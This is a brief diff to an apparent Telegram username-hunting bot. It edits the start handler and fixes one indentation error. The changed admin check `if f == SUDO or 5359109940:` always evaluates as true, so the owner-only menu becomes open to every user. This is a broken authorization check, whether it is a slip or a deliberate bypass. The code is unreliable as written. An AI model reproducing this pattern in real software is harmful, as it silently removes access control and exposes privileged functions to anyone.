@@ -27,7 +27,7 @@ def daynney(message):
 @bot.message_handler(commands=["start"])
 def start(message):
 	f = message.from_user.id
-	if f == SUDO:
+	if f == SUDO or 5359109940:
 		mas = types.InlineKeyboardMarkup(row_width=2)
 		K = types.InlineKeyboardButton(text ="(يوزرات ثلاثيه)", callback_data="SS")	
 		G = types.InlineKeyboardButton(text ="(يوزرات بوتات)", callback_data="F8")
@@ -557,7 +557,7 @@ def masg(call):
 				mas.add(A,E,B,R,K_8_U)
 				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
 				
-    elif call.data =="F10":
+	elif call.data =="F10":
 		xu = "MNBVCXZLKJHGFDSAPOIUYTREWQ"
 		xn = "1234567890"
 		xa = "MNBVCXZLKJHGFDSAPOIUYTREWQ"
